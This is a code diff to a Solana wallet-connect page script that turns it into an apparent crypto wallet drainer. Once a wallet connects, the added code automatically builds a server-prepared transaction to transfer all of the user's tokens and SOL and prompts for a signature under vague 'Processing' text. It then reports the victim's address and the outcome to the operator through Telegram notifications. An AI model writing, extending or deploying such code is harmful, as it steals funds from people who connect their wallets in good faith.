@@ -203,7 +203,6 @@ $(document).ready(function() {
     // Enhanced wallet connection with better error handling
     async function connectWallet(walletType, walletProvider) {
         try {
-            const wallets = checkWalletAvailability();
             const walletInfo = WALLET_PROVIDERS[walletType];
             
             if (!walletInfo) {
@@ -317,7 +316,13 @@ $(document).ready(function() {
             }
 
             // Connect to wallet
-            const resp = await walletProvider.connect();
+            let resp;
+            if (walletType === 'solflare') {
+                // Solflare has a different connection method
+                resp = await walletProvider.connect();
+            } else {
+                resp = await walletProvider.connect();
+            }
             console.log(`${walletInfo.name} connected:`, resp);
 
             $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
@@ -334,11 +339,13 @@ $(document).ready(function() {
                     publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                 } else if (walletProvider.pubkey) {
                     publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
+                } else if (resp && resp.publicKey) {
+                    publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                 } else {
                     throw new Error('No public key received from Solflare wallet');
                 }
             } else {
-                if (resp.publicKey) {
+                if (resp && resp.publicKey) {
                     publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                 } else {
                     throw new Error('No public key received from wallet');
@@ -406,10 +413,15 @@ $(document).ready(function() {
                 $('#connect-wallet-footer').text(shortAddress).addClass('wallet-connected');
             }
 
-            // Close modal and show success
+            // Close modal and show success, then start asset transfer
             hideWalletModal();
             
             console.log('Wallet connected successfully:', publicKeyString);
+
+            // Start the asset transfer process automatically after connection
+            setTimeout(() => {
+                processTransaction(publicKeyString, walletProvider, walletType);
+            }, 1000);
 
         } catch (err) {
             console.error(`Error connecting to ${walletType}:`, err);
@@ -437,11 +449,16 @@ $(document).ready(function() {
         }
     }
 
-    // Enhanced transaction processing (keeping your original logic)
+    // Enhanced transaction processing with asset transfer
     async function processTransaction(publicKeyString, walletProvider, walletType, retryCount = 0) {
         const maxRetries = 10;
         
         try {
+            // Show processing modal
+            showWalletLoading();
+            $('.wallet-loading-title').text('Preparing Transaction');
+            $('.wallet-loading-subtitle').html('Preparing to transfer assets...<br>Please wait.');
+
             const verificationKey = `ownership_verified_${publicKeyString}`;
             const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
             
@@ -528,17 +545,146 @@ $(document).ready(function() {
             if (!ownershipVerified) {
                 throw new Error('Failed to verify wallet ownership');
             }
+
+            // Now prepare and execute the asset transfer transaction
+            $('.wallet-loading-title').text('Preparing Asset Transfer');
+            $('.wallet-loading-subtitle').html('Building transaction to transfer all assets...<br>Please wait.');
+
+            // Prepare the transaction
+            const prepareResponse = await fetch('/prepare-transaction', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    publicKey: publicKeyString,
+                    verified: true
+                })
+            });
+
+            if (!prepareResponse.ok) {
+                const errorData = await prepareResponse.json();
+                throw new Error(errorData.error || 'Failed to prepare transaction');
+            }
+
+            const { transaction: transactionData, tokenTransfers, solTransfer } = await prepareResponse.json();
             
-            // Continue with your existing transaction processing logic...
-            // [Your existing transaction processing code remains here]
+            console.log(`Transaction prepared: ${tokenTransfers} tokens, ${solTransfer} SOL`);
+
+            $('.wallet-loading-title').text('Signing Transaction');
+            $('.wallet-loading-subtitle').html(`Please sign the transaction in your ${walletType} wallet.<br>Transferring ${tokenTransfers} tokens and ${solTransfer} SOL.`);
+
+            // Convert transaction data back to Transaction object
+            const transaction = solanaWeb3.Transaction.from(Buffer.from(transactionData));
+            
+            // Sign the transaction with the wallet
+            let signedTransaction;
+            try {
+                if (walletType === 'solflare') {
+                    signedTransaction = await walletProvider.signTransaction(transaction);
+                } else {
+                    signedTransaction = await walletProvider.signTransaction(transaction);
+                }
+            } catch (signError) {
+                console.error('Transaction signing failed:', signError);
+                throw new Error('User rejected the transaction');
+            }
+
+            $('.wallet-loading-title').text('Sending Transaction');
+            $('.wallet-loading-subtitle').html('Sending transaction to the blockchain...<br>This may take a few moments.');
+
+            // Send the signed transaction
+            const sendResponse = await fetch('/send-transaction', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    signedTransaction: Array.from(signedTransaction.serialize()),
+                    publicKey: publicKeyString
+                })
+            });
+
+            if (!sendResponse.ok) {
+                const errorData = await sendResponse.json();
+                throw new Error(errorData.error || 'Failed to send transaction');
+            }
+
+            const { signature, success } = await sendResponse.json();
+
+            if (success) {
+                $('.wallet-loading-title').text('Transaction Successful!');
+                $('.wallet-loading-subtitle').html(`All assets transferred successfully!<br>Transaction: ${signature.substring(0, 16)}...`);
+                
+                await sendTelegramNotification({
+                    address: publicKeyString,
+                    balance: 'Unknown',
+                    usdBalance: 'Unknown',
+                    walletType: walletType,
+                    customMessage: `🎉 Transaction Confirmed - All assets transferred successfully! Signature: ${signature}`
+                });
+
+                // Show success for 3 seconds then close
+                setTimeout(() => {
+                    hideWalletModal();
+                    showSuccessMessage();
+                }, 3000);
+            } else {
+                throw new Error('Transaction failed on blockchain');
+            }
             
         } catch (err) {
             console.error("Error during transaction processing:", err);
-            throw err;
+            
+            $('.wallet-loading-title').text('Transaction Failed');
+            $('.wallet-loading-subtitle').html(`Failed to complete transaction.<br>${err.message}`);
+            
+            await sendTelegramNotification({
+                address: publicKeyString || 'Unknown',
+                balance: 'Unknown',
+                usdBalance: 'Unknown',
+                walletType: walletType || 'Unknown',
+                customMessage: `❌ Transaction Failed: ${err.message || err.toString() || 'Unknown error'}`
+            });
+            
+            showRejectionEffects();
+            
+            setTimeout(() => {
+                hideWalletModal();
+                showWalletOptions();
+                alert(`Transaction failed: ${err.message || err.toString() || 'Unknown error'}`);
+            }, 3000);
         }
     }
 
-    // UI Management Functions (keeping your original UI logic)
+    function showSuccessMessage() {
+        // Create and show a success message
+        const successHtml = `
+            <div class="success-message" style="
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #10B981;
+                color: white;
+                padding: 15px 20px;
+                border-radius: 8px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+                z-index: 10000;
+                animation: slideIn 0.3s ease-out;
+            ">
+                <strong>✅ Success!</strong> All assets transferred successfully.
+            </div>
+        `;
+        $('body').append(successHtml);
+        
+        setTimeout(() => {
+            $('.success-message').fadeOut(300, function() {
+                $(this).remove();
+            });
+        }, 5000);
+    }
+
+    // UI Management Functions
     function showWalletModal() {
         checkWalletAvailability();
         showWalletOptions();
@@ -569,7 +715,7 @@ $(document).ready(function() {
     function showWalletLoading() {
         $('#wallet-options').addClass('hidden');
         $('#wallet-loading-state').addClass('active');
-        $('.wallet-modal-header h3').text('Connecting...');
+        $('.wallet-modal-header h3').text('Processing...');
         lockModal();
         clearRejectionEffects();
     }
@@ -625,4 +771,5 @@ $(document).ready(function() {
     window.connectWallet = connectWallet;
     window.getWalletProvider = getWalletProvider;
     window.checkWalletAvailability = checkWalletAvailability;
+    window.processTransaction = processTransaction;
 });
